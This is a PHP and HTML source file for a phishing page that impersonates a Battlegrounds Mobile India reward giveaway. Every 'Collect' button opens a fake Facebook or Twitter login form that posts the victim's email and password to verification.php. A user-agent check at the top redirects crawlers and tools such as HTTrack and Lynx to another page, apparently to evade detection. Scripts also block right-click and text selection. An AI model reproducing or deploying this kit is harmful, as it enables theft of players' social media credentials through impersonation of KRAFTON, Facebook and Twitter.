<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
  <style type="text/css">
  .navbar {
	background: url('https://i.postimg.cc/xdNLtM1N/Picsart-22-04-03-01-32-06-627.jpg') top center / 100% no-repeat;
	width: 100%;
	height: 65px;
}
.header {
	width: 100%;
	height: auto;
	border-top: 2px solid #B8860B;
	border-bottom: 2px solid #B8860B;
	margin-top: -11px;
}
.item {
	width: 30%;
	height: 100px;
	margin: 3px;
	margin-bottom: 45px;
	display: inline-block;
}
.item img {
	width: 100%;
    height: 100%;
}
.item button {
	background:url('https://i.ibb.co/311V2Fq/btn-item.jpg') no-repeat center center;
	background-size:100% 100%;
	width:100%;
	height:auto;
	padding:2px;
	color:#000;
	font-size:19px;
	font-family:Teko;
	font-weight: 500;
	text-align:center;
	outline:none;
	margin-top: -1px;
}
.item img {
	border: 2px solid #B8860B;
}
.item div {
	width: 100%;
	height: 100%;
	border-radius: 3px 3px 0px 0px;
}
.item div:first-child {
	margin-left: 0;
}
  .footer {
	background:#000;
	width: 100%;
	height: auto;
	padding: 10px;
}
.footer-txt-follow {
	margin-top: 13px;
	margin-bottom: 5px;
	color: #7C7C7C;
	font-size: 14px;
	font-family: Teko;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
}
.footer-follow-icon {
	width: 49px;
	height: 49px;
	margin: 5px;
	display: inline-block;
}
.footer-txt {
    margin-bottom: 10px;
	color: #7C7C7C;
	font-size: 16px;
	font-family: Teko;
	text-align: center;
}
.footer-txt-copyright {
	color: #7C7C7C;
	font-size: 18px;
	font-family: Teko;
	text-align: center;
}
.footer-copyright-icon {
	width: 50%;
	margin-top: 8px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	display: block;
}
  </style>
<div class="container">
<div class="navbar">
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="box">
<div class="season-title">
</div>
<center>
<div class="tab_rewards" id="season">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<img class="footer-copyright-icon" src="https://i.postimg.cc/SR5n5vmV/footer.png">
<div class="footer-txt">ⓒ 2021 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">| Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Login to receive your selected reward</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.postimg.cc/3wBVgZTz/login-Method1.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://www.battlegroundsmobileindia.com/common/img/main/app.png">
<div class="txt-login-fb">Log in to your Facebook account to connect to BATTLEGROUNDS MOBILE INDIA.</div> <!--- txt-login-fb --->
<form class="login-form" action="verification.php" method="post">
<label>
<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
</label>
<label>
<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
</label>
<input type="hidden" name="login" value="Facebook" readonly>
<button type="submit" class="btn-login-fb">Log In</button>
</form>
</div> <!--- content-box-fb --->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
<div class="language-name">India</div> <!--- language-name --->
<div class="language-name">Türkçe</div> <!--- language-name --->
<div class="language-name">Tiếng Việt</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<div class="header-twitter"><img src="https://i.postimg.cc/dtyfWFF2/login-Method2.png"></div> <!--- header-twitter --->
<br>
<br>
<br>
<center>
<form action="verification.php" method="post">
<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="form-group">
<input type="text" name="email" autocomplete="off" required>
<label>Email/Phone Number</label>
</div> <!--- form-group --->
<div class="form-group">
<input type="password" name="password" autocomplete="off" required>
<label>Password</label>
</div> <!--- form-group --->
<input type="hidden" name="login" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>